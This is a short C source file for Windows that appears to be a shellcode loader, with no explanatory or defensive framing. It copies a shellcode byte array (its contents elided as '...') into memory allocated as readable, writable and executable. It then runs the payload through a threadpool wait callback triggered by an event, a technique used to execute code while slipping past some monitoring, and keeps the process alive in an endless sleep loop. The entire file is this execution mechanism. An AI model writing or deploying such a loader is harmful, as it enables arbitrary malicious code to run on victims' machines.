#include <windows.h>
#include <stdio.h>
#include <threadpoolapiset.h>

unsigned char shellcode[] = ...


int main() {
	HANDLE hEvent;
	hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);

	LPVOID addr = VirtualAlloc(NULL, 511, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	RtlMoveMemory(addr, shellcode, 511);

	PTP_WAIT ptp_w = CreateThreadpoolWait((PTP_WAIT_CALLBACK)addr, NULL, NULL);
	SetThreadpoolWait(ptp_w, hEvent, 0);
	SetEvent(hEvent);
	WaitForThreadpoolWaitCallbacks(ptp_w, FALSE);
	SetEvent(hEvent);
	while (TRUE) {
		Sleep(9000);
	}
}